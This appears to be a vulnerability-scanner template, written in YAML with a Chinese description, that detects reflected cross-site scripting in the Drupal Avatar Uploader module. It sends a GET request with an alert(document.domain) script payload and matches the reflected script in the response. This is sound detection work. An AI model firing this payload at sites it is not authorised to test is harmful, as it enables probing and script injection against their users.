id: drupal-avatar-xss

info:
  name: Drupal Avatar Uploader - 跨站脚本漏洞
  author: bywalks
  severity: high
  description: |
    该模板用于检测 Drupal Avatar Uploader - 跨站脚本漏洞。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E` 等路径发送探测请求，并根据响应中的 `<div><script>alert(document.domain)</script></div>`、`text/html` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://www.exploit-db.com/exploits/50841
    - https://packetstormsecurity.com/files/166409/Drupal-Avatar-Upload-7.x-1.0-beta8-Cross-Site-Scripting.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-80
  metadata:
    max-request: 1
  tags: xss,drupal,edb,packetstorm,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<div><script>alert(document.domain)</script></div>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
